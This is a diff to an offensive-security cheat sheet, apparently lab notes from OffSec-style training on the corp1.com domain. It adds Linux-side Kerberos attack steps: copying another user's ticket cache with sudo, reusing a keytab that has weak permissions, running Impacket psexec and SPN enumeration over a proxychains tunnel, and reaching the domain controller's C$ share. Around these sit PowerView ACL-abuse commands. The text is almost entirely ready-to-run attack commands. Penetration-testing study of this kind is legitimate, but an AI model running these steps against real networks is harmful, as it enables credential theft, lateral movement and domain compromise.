@@ -25,7 +25,57 @@ Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Righ
 Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
 ```
 
-## Kerberos Operation
+## Kerberos Operation (Linux)
+### General Command
+```bash
+#Checking if Kerberos exists
+env | grep KRB5CCNAME
+
+#Initiate of Keberos TGT
+kinit
+
+#Checking existing TGT
+klist
+
+#Checking SPNs
+ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
+
+#Initiate ST
+kvno MSSQLSvc/DC01.corp1.com:1433
+```
+
+### Path 1: Stealing Ticket File 
+**Logic**: Steal ticket file (with sudo right) → Change Ticket Owner → Request TGT and ST
+```bash
+sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
+sudo chown offsec:offsec /tmp/krb5cc_minenow
+kdestroy
+klist
+export KRB5CCNAME=/tmp/krb5cc_minenow
+kvno MSSQLSvc/DC01.corp1.com:1433
+```
+
+**Impacket Version with proxychain**
+```bash
+#In Victim
+ssh offsec@linuxvictim -D 9050
+
+#Example of operation
+proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
+```
+
+### Path 2: Stealing KeyTab File
+**Logic**: Steal Ticket File (Incorrect permission configured) → Kinit
+```bash
+#Kinit using keytab file
+kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
+
+#SMB For testin
+smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
+```
+## Kerberos Operation (Windows)
 ### Unconstrainted Delegation
 **Logic**: Use WriteDACL to modify the access → GenericAll permission → modify related password to gain access
 ```powershell
